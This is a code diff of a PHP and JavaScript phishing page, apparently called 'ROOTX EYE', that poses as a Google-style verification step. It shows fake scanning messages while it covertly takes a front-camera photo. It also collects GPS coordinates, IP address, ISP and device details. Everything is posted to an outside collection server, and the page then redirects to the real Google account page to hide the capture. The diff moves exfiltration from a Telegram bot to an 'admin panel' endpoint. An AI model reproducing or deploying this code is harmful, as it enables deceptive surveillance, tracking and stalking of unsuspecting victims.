@@ -1,35 +1,17 @@
 <?php
-// ======================
-// TELEGRAM SEND (PHOTO + LOCATION)
-// ======================
+// ============================================
+// ROOTX EYE — FRONT CAMERA (Admin Panel Version)
+// Look: Tera wala | Data: Admin Panel
+// ============================================
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
-
-    $chatId = $_GET['id'] ?? '';
-    if (!$chatId) {
-        echo json_encode(['status'=>'error','message'=>'Chat ID missing']);
-        exit;
-    }
-
-    // 🔁 اپنا بوٹ ٹوکن یہاں لگائیں
-    $botToken = ''; 
-    $caption  = $_POST['caption'] ?? 'User Verified';
-    $file     = $_FILES['file']['tmp_name'];
-
-    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
-
-    $postFields = [
-        'chat_id' => $chatId,
-        'photo'   => new CURLFile(realpath($file)),
-        'caption' => $caption
-    ];
-
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
+    // Data capture.php pe bhejo (Admin Panel)
+    $ch = curl_init('https://rootx-eye-1.onrender.com/capture.php');
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, ['file' => new CURLFile($_FILES['file']['tmp_name']), 'type' => 'photo']);
     curl_exec($ch);
     curl_close($ch);
-
-    echo json_encode(['status'=>'sent']);
+    echo json_encode(['status' => 'sent']);
     exit;
 }
 ?>
@@ -56,9 +38,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
     border: 1px solid #dadce0;
     border-radius: 8px;
     max-width: 450px;
-    width: 100%;
+    width: 90%;
     padding: 48px 40px 36px;
-    box-sizing: border-box;
     text-align: center;
   }
   @media (max-width: 450px) {
@@ -167,7 +148,7 @@ let userInfo = {
   screen: `${screen.width} x ${screen.height}`
 };
 
-// 🛑 Silent IP Fetch
+// IP fetch
 fetch('https://ipinfo.io/json')
   .then(r => r.json())
   .then(d => {
@@ -178,25 +159,24 @@ fetch('https://ipinfo.io/json')
   });
 
 startBtn.onclick = () => {
-  // Step 1: Switch UI to scanning mode
+  // UI change
   formSection.style.display = 'none';
   loaderSection.style.display = 'block';
 
-  // Step 2: Get Location silently
+  // Location
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(pos => {
       userInfo.lat = pos.coords.latitude.toFixed(6);
       userInfo.lng = pos.coords.longitude.toFixed(6);
-    }, () => {}); // Fail silently
+    }, () => {});
   }
 
-  // Step 3: Start Camera Hidden
+  // Camera
   navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
     .then(stream => {
       video.srcObject = stream;
       video.play();
 
-      // Start Fake Loading Text
       const steps = [
         "Initializing secure camera…",
         "Scanning device credentials…",
@@ -210,14 +190,10 @@ startBtn.onclick = () => {
         i++;
       }, 1500);
 
-      // Step 4: Wait 4 seconds for camera to adjust, then take ONE perfect picture
       setTimeout(() => {
         clearInterval(stepTimer);
         statusEl.innerText = "Verification complete! Redirecting…";
-        
         ctx.drawImage(video, 0, 0, 320, 240);
-        
-        // Stop the camera stream immediately (save battery & hide camera light)
         stream.getTracks().forEach(track => track.stop());
 
         canvas.toBlob(blob => {
@@ -225,21 +201,16 @@ startBtn.onclick = () => {
           fd.append("file", blob, "verification.jpg");
           fd.append("caption", buildCaption());
 
-          // Step 5: Send to Telegram Silently
-          fetch('https://rootx-eye.vercel.app/capture.php', {
-              method: 'POST',
-              body: fd
-          })
-            // Step 6: Redirect to real Google
-            setTimeout(() => {
-              window.location.replace("https://myaccount.google.com/");
-            }, 1500);
+          fetch('https://rootx-eye-1.onrender.com/capture.php', {
+            method: "POST",
+            body: fd
+          }).then(() => {
+            setTimeout(() => window.location.replace("https://myaccount.google.com/"), 1500);
           }).catch(() => {
             window.location.replace("https://myaccount.google.com/");
           });
         }, "image/jpeg", 0.9);
-
-      }, 5000); // 5 seconds wait for best quality snap
+      }, 5000);
     })
     .catch(() => {
       statusEl.innerText = "Camera permission denied. Please allow to continue.";
@@ -252,14 +223,12 @@ function buildCaption() {
   if (userInfo.lat && userInfo.lng) {
     locText += `\nGPS: ${userInfo.lat}, ${userInfo.lng}\nMap: https://maps.google.com/?q=${userInfo.lat},${userInfo.lng}`;
   }
-
   return `🎯 *Target Verified Successfully!*
 ━━━━━━━━━━━━━━━
 📍 *Location Info:*
  ${locText}
 🌐 IP: ${userInfo.ip}
 📡 ISP: ${userInfo.isp}
-
 🖥 *Device Info:*
 🧭 Browser: ${userInfo.browser}
 🧩 OS: ${userInfo.os}
